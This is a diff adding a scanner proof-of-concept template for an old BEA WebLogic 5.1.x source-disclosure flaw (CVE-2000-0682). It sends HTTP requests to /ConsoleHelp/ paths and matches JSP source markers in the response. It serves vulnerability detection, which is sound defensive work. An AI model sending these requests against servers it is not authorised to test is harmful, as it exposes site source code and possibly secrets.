@@ -1,0 +1,62 @@
+[info]
+author = "AVE"
+description = "BEA WebLogic 5.1.x 存在源代码泄露漏洞，远程攻击者通过在 URL 中插入 /ConsoleHelp/ 路径，可触发 FileServlet 返回 JSP 等页面的原始源代码。通过发送包含 /ConsoleHelp/ 的 HTTP 请求，若响应包含 JSP 源码特征（如 <% page、import、class 等），则判定存在漏洞。"
+id = "POC-AVE-2000-0841"
+name = "BEA WebLogic 源代码泄露漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0841"]
+vuln_id = [
+    "CVE-2000-0682",
+    "AVE-2000-0841",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/ConsoleHelp/default.jsp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "page",
+    "import",
+    "class",
+    "java.io",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/ConsoleHelp/examples/jsp/num/numguess.jsp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "page",
+    "import",
+    "java",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/ConsoleHelp/index.jsp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "page",
+    "java",
+]
